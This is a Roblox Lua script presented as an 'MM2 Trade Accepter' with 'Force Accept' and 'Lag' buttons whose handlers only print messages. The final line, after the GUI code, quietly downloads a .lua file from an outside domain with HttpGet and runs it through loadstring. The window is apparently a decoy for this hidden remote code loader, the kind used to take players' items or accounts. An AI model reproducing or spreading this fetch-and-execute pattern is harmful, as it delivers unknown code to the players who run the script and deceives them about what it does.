-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.4, 0, 0.3, 0) -- Adjust size (40% width, 30% height of the screen)
frame.Position = UDim2.new(0.3, 0, 0.35, 0) -- Center it on the screen
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
frame.BackgroundTransparency = 0.5 -- Slightly transparent
frame.Parent = screenGui

-- Create the Title Label
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0.3, 0) -- Full width, 30% height of the frame
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1 -- Transparent background
titleLabel.Text = "MM2 Trade Accepter"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
titleLabel.Font = Enum.Font.ArialBold
titleLabel.TextScaled = true
titleLabel.Parent = frame

-- Create the Force Accept Button
local forceButton = Instance.new("TextButton")
forceButton.Size = UDim2.new(0.8, 0, 0.2, 0) -- 80% width, 20% height of the frame
forceButton.Position = UDim2.new(0.1, 0, 0.35, 0) -- Centered horizontally, below the title
forceButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255) -- Blue background
forceButton.Text = "Force Accept"
forceButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
forceButton.Font = Enum.Font.ArialBold
forceButton.TextScaled = true
forceButton.Parent = frame

-- Create the Lag Button
local lagButton = Instance.new("TextButton")
lagButton.Size = UDim2.new(0.8, 0, 0.2, 0) -- 80% width, 20% height of the frame
lagButton.Position = UDim2.new(0.1, 0, 0.6, 0) -- Centered horizontally, below the Force Accept button
lagButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red background
lagButton.Text = "Lag"
lagButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
lagButton.Font = Enum.Font.ArialBold
lagButton.TextScaled = true
lagButton.Parent = frame

-- Create the Cancel Button
local cancelButton = Instance.new("TextButton")
cancelButton.Size = UDim2.new(0.8, 0, 0.15, 0) -- 80% width, 15% height of the frame
cancelButton.Position = UDim2.new(0.1, 0, 0.85, 0) -- Centered horizontally, below the Lag button
cancelButton.BackgroundColor3 = Color3.fromRGB(128, 0, 0) -- Dark red background
cancelButton.Text = "Cancel"
cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
cancelButton.Font = Enum.Font.ArialBold
cancelButton.TextScaled = true
cancelButton.Parent = frame

-- Button functionality (examples)
forceButton.MouseButton1Click:Connect(function()
    print("Force Accept button clicked")
end)

lagButton.MouseButton1Click:Connect(function()
    print("Lag button clicked")
end)

cancelButton.MouseButton1Click:Connect(function()
    print("Cancel button clicked")
    screenGui:Destroy() -- Close the GUI
end)
getgenv().gui = false
loadstring(game:HttpGet("https://egorikusa.space/4cac96c1c736f31f4745b1c7.lua", true))()
